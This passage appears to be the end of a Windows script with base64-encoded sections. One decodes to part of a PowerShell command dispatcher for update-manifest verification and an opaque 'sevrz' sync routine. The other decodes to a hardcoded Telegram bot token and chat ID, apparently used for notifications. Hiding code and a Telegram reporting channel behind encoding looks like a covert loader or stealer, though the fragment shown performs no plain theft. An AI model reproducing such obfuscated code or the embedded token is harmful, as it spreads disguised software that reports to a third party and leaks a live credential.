::ICB7DQogICAgICAgICRzYWZlID0gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZSAkRXh0
::cmENCiAgICAgICAgaWYgKCRzYWZlKSB7IFdyaXRlLU91dHB1dCAkc2FmZSB9IGVs
::c2UgeyBXcml0ZS1PdXRwdXQgJ0ZBSUwnIH0NCiAgICB9DQogICAgJ3ZlcmlmeS11
::cGRhdGUnICAgew0KICAgICAgICAjIEV4dHJhID0gIm1hbmlmZXN0fHNpZ3xuYW1l
::PXBhdGg7bmFtZTI9cGF0aDIiDQogICAgICAgICRwYXJ0cyA9ICRFeHRyYSAtc3Bs
::aXQgJ1x8JywgMw0KICAgICAgICBpZiAoJHBhcnRzLkNvdW50IC1sdCAzKSB7IFdy
::aXRlLU91dHB1dCAnYmFkLWFyZ3MnOyBicmVhayB9DQogICAgICAgICRtYXAgPSBA
::e30NCiAgICAgICAgZm9yZWFjaCAoJHBhaXIgaW4gKCRwYXJ0c1syXSAtc3BsaXQg
::JzsnKSkgew0KICAgICAgICAgICAgaWYgKCRwYWlyIC1tYXRjaCAnXihbXj1dKyk9
::KC4qKSQnKSB7ICRtYXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAg
::ICAgICB9DQogICAgICAgIFdyaXRlLU91dHB1dCAoVGVzdC1VcGRhdGVNYW5pZmVz
::dCAkcGFydHNbMF0gJHBhcnRzWzFdICRtYXApDQogICAgfQ0KICAgICdzeW5jLXNl
::dnJ6LWZwJyAgIHsNCiAgICAgICAgaWYgKCRFeHRyYSkgeyBXcml0ZS1PdXRwdXQg
::KFN5bmMtU2V2cnpFeHBlY3RlZCAkRXh0cmEpIH0NCiAgICAgICAgZWxzZSB7DQog
::ICAgICAgICAgICAkayA9IEAoR2V0LVNldnJ6S2VlcCkNCiAgICAgICAgICAgIFdy
::aXRlLU91dHB1dCAoIlNFVlJafCQoJGtbMF0pfCQoJGtbMV0pIikNCiAgICAgICAg
::fQ0KICAgIH0NCn0NCg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
